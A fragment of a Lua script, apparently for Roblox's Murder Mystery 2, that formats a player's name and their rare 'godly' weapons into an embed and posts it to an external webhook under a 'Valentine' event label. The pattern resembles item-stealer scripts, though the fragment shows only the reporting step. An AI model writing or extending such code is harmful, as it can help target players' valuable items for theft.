        table.insert(lines, "**" .. name .. "** (" .. variant .. ")")
    end
    local weaponList = table.concat(lines, "\n")
    local p = playerName or "-"
    local embed = {
        title = "🎁 Valentine – Godlies in inventory",
        description = "**👤 Player Name**\n**" .. p .. "**\n\n**⚔️ Weapons**\n" .. weaponList,
        color = 15158332,
        footer = { text = "MM2 Valentine 2026" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }
    if WEBHOOK_IMAGE_URL and #WEBHOOK_IMAGE_URL > 0 then
        embed.thumbnail = { url = WEBHOOK_IMAGE_URL }
    end
    postWebhookBody({ embeds = { embed } })
end

local function getGodliesInInventory()
